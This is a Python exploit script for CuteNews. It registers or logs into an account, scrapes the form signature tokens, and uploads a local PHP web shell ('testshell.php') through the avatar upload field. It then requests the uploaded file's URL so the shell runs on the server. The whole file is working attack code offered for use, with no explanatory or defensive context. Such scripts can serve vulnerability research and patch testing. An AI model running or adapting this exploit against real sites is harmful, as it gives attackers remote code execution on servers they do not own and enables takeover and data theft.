# coding:utf-8

# login
# if not user then register
# send php file to avatar
# send cmd

import requests
import random
import string
import re


class Poc:

    def __init__(self, url):
        self.base_url = url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        }

        self.ss = requests.session()

    def login(self, username, password):
        login_url = self.base_url + "/CuteNews/index.php"

        data = {
            "action": "dologin",
            "username": username,
            "password": password,
        }

        # allow_redirects=False: forbidden to redirect
        login_res = self.ss.post(url=login_url, data=data, allow_redirects=False)

        content = login_res.content.decode()
        if "Invalid password or login" in content:
            print("Invalid password or login")
        else:
            response = self.ss.get(login_url + '?mod=main&opt=personal')
            if "Dashboard" in response.content.decode():
                print("login successfully")

    def register(self):
        regis_url = self.base_url + "/CuteNews/index.php?register"

        user_pass = "".join(random.sample(string.ascii_letters + string.digits, 6))

        data = {
            "action": "register",
            "regusername": user_pass,
            "regnickname": user_pass,
            "regpassword": user_pass,
            "confirm": user_pass,
            "regemail": user_pass + "@qq.com",
        }

        print("Your usernaem is: ", user_pass)
        print("Your password is: ", user_pass)
        print("Your email is: ", data["regemail"])

        regis_res = self.ss.post(url=regis_url, data=data)
        if "Dashboard" in regis_res.content.decode():
            print("register successfully, now you has logined")

    def send_paylaod(self):
        filename = "testshell.php"
        with open(filename, 'rb') as f:
            payload = f.read()

        vul_url = self.base_url + "/CuteNews/index.php?mod=main&opt=personal"

        # upload paylaod
        # get avatar url
        # send request to that url

        res = self.ss.get(vul_url)
        content = res.content.decode()
        editusername = re.findall('username" disabled="disabled" value="(.*?)"', content)[0]
        signature_key = re.findall('signature_key" value="(.*?)"', content)[0]
        signature_dsi = re.findall('signature_dsi" value="(.*?)"', content)[0]
        # print(editusername)
        # print(signature_key)
        # print(signature_dsi)

        data = {
            "mod": (None, "main"),
            "opt": (None, "personal"),
            "__signature_key": (None, signature_key),
            "__signature_dsi": (None, signature_dsi),
            "editpassword": (None, ""),
            "confirmpassword": (None, ""),
            "editnickname": (None, editusername),
            "avatar_file": (filename, payload),
            "more[site]": "",
            "more[about]": "",
        }

        pay_res = self.ss.post(url=vul_url, files=data)
        pay_content = pay_res.content.decode()

        avatar_url = re.findall('<img src="(.*?)"', pay_content)[0]
        print("The uploaded file url: ", avatar_url)

        self.ss.get(url=avatar_url)

    def run(self):

        user_flag = input("Do you hava a user account? [yes] or [no]").casefold()
        if user_flag == 'yes':
            print("*********please input your username and password****************")
            username = input("username: ")
            password = input("passowrd: ")
            self.login(username, password)
            self.send_paylaod()
        elif user_flag == 'no':
            self.register()
            self.send_paylaod()


if __name__ == '__main__':
    url = input("please input url:")
    poc = Poc(url)
    poc.run()
